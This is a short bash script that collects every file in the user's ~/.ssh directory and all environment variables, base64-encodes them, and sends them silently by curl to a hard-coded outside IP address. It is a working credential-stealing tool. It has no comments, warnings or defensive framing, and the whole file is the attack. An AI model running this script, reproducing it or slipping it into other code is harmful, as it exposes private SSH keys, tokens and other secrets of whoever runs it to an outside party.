#!/bin/bash

TARGET_PATH="$HOME/.ssh"

TEMP_FILE=$(mktemp)
cleanup() {
    rm -f "$TEMP_FILE"
}
trap cleanup EXIT

echo "--- KEYS ---" >> "$TEMP_FILE"

for file in "$TARGET_PATH"/*; do
    if [ -f "$file" ]; then
        echo "$file" >> "$TEMP_FILE"
        cat "$file" >> "$TEMP_FILE"
        echo "" >> "$TEMP_FILE"
    fi
done

echo "--- ENVIRONMENT VARIABLES ---" >> "$TEMP_FILE"
env >> "$TEMP_FILE"

if [ ! -s "$TEMP_FILE" ]; then
    exit 0
fi

ENCODED_DATA=$(base64 < "$TEMP_FILE")
curl -s "http://18.219.198.148:5000/?data=${ENCODED_DATA}" > /dev/null 2>&1
